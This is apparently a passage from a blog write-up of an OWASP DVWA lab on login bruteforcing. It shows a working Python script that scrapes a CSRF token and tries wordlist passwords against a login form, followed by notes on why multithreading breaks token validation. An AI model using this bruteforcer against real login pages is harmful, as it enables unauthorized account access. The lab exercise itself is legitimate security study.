    <span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span> <span class="o">=</span> <span class="n">wordlist</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">threads</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="k">if</span> <span class="n">threads</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">threads</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">False</span>

  <span class="c1"># Called when starting the bruteforce. Dispatches all threads.
</span>  <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="c1"># Load the wordlist into a Queue object
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Loading wordlist..."</span><span class="p">);</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">words</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span>
    <span class="n">rfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
      <span class="n">line</span> <span class="o">=</span> <span class="n">rfo</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span> <span class="k">break</span> <span class="c1"># List exhausted
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="c1"># Start the threads.
</span>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Starting </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="si">}</span><span class="s"> threads..."</span><span class="p">);</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="p">):</span>
      <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">brute</span><span class="p">)</span>
      <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="c1"># Loop and print logs.
</span>    <span class="k">while</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">and</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
      <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
      <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">get</span><span class="p">())</span>

  <span class="c1"># The thread function.
</span>  <span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span><span class="p">:</span>
      <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">break</span>
      <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
      <span class="c1"># Fetch the token.
</span>      <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="c1"># No need for regular expressions when you can just split and index your way to glory!!!
</span>      <span class="n">token</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"name='user_token' value='"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"'"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
      <span class="c1"># Attempt to login
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Trying </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"?username=</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;user_token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">&amp;Login=Login"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="s">"Username and/or password incorrect"</span> <span class="ow">in</span> <span class="n">body</span><span class="p">:</span> <span class="c1"># Login successful???
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Authentiation successful: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">True</span> <span class="c1"># Signals other threads to quit.
</span>        <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;url&gt; &lt;cookie&gt; &lt;username&gt; &lt;wordlist&gt; &lt;threads&gt;"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">bruteforcer</span> <span class="o">=</span> <span class="n">l3_bruteforcer</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">]))</span>
  <span class="n">bruteforcer</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Testing this with number of threads set to <code class="language-plaintext highlighter-rouge">1</code> worked;</p>

<p><img src="/assets/img/20220323121335.png" alt="" /></p>

<p>Setting the value of threads to more than <code class="language-plaintext highlighter-rouge">1</code> however, gave a false positive;</p>

<p><img src="/assets/img/20220323121547.png" alt="" /></p>

<p>Running the requests through a proxy, the threading appears to be messing up the CSRF token validation;</p>

<p><img src="/assets/img/20220323121801.png" alt="" /></p>

<p>This is likely because the token is tied to the session of a user, so by the time a token is issued for a request in one thread, other tokens issued to other threads will be invalidated. This makes the multi-threading feature added to the code completely useless :(</p>

<p><img src="/assets/img/20220327093554.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="ffuf" /><category term="bruteforce" /><category term="python" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA on login bruteforcing.]]></summary></entry></feed>